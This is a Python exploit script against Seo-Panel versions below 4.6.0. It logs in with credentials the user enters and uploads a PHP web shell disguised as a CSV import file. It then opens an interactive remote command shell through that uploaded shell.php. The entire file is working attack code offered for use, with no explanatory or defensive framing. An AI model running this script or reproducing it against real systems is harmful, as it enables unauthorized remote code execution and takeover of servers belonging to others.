import requests


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'


class SeoPanelExploit:
    def __init__(self, r_host, username, password, web_port, uri):
        self.r_host = r_host
        self.username = username
        self.password = password
        self.web_port = web_port
        self.uri = uri

    def send_exploit(self):
        session = requests.session()

        burp0_url = self.uri + "://" + self.r_host + ":" + self.web_port + "//login.php"
        burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                         "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "DNT": "1",
                         "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        session.get(burp0_url, headers=burp0_headers, verify=False)

        burp0_url = self.uri + "://" + self.r_host + ":" + self.web_port + "//login.php"
        burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                         "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
                         "Referer": self.uri + "://" + self.r_host + "//login.php",
                         "Content-Type": "application/x-www-form-urlencoded",
                         "DNT": "1", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        burp0_data = {"sec": "login", "red_referer": self.uri + "://" + self.r_host + "/", "userName": self.username,
                      "password": self.password,
                      "login": ''}
        session.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)

        burp0_url = self.uri + "://" + self.r_host + ":" + self.web_port + "//websites.php"
        burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0",
                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                         "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
                         "Referer": self.uri + "://" + self.r_host + "//admin-panel.php",
                         "Content-Type": "multipart/form-data; boundary=---------------------------193626971803013289998688514",
                         "DNT": "1", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        burp0_data = "-----------------------------193626971803013289998688514\r\nContent-Disposition: form-data; name=\"sec\"\r\n\r\nimport\r\n-----------------------------193626971803013289998688514\r\nContent-Disposition: form-data; name=\"userid\"\r\n\r\n1\r\n-----------------------------193626971803013289998688514\r\nContent-Disposition: form-data; name=\"website_csv_file\"; filename=\"shell.php\"\r\nContent-Type: text/csv\r\n\r\n<?php system($_GET['cmd']); ?>\r\n-----------------------------193626971803013289998688514\r\nContent-Disposition: form-data; name=\"delimiter\"\r\n\r\n,\r\n-----------------------------193626971803013289998688514\r\nContent-Disposition: form-data; name=\"enclosure\"\r\n\r\n\"\r\n-----------------------------193626971803013289998688514\r\nContent-Disposition: form-data; name=\"escape\"\r\n\r\n\\\r\n-----------------------------193626971803013289998688514--\r\n"
        session.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)

        first = 1
        while True:
            remote_command = input(f"{Colors.red}(Remote Code Execution Shell){Colors.end} [command]:~#")
            burp0_url = self.uri + "://" + self.r_host + ":" + self.web_port + "//tmp/shell.php?cmd=" + remote_command
            burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0",
                             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                             "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "DNT": "1",
                             "Connection": "close", "Upgrade-Insecure-Requests": "1"}
            x = session.get(burp0_url, headers=burp0_headers, verify=False)
            if x.status_code == 200 and first == 1:
                first = 0
                print(x.text)
            if remote_command == "exit":
                break


attack = SeoPanelExploit(
    uri=input(f"{Colors.red}(Seo-Panel <4.6.0 Authenticated Remote Code Execution){Colors.end} [Enter URI]:~#"),
    r_host=input(
        f"{Colors.red}(Seo-Panel <4.6.0 Authenticated Remote Code Execution){Colors.end} [Enter Remote Host]:~#"),
    web_port=input(
        f"{Colors.red}(Seo-Panel <4.6.0 Authenticated Remote Code Execution){Colors.end} [Enter Remote Port]:~#"),
    username=input(
        f"{Colors.red}(Seo-Panel <4.6.0 Authenticated Remote Code Execution){Colors.end} [Enter Username]:~#"),
    password=input(
        f"{Colors.red}(Seo-Panel <4.6.0 Authenticated Remote Code Execution){Colors.end} [Enter Password]:~#")
)

if __name__ == "__main__":
    attack.send_exploit()
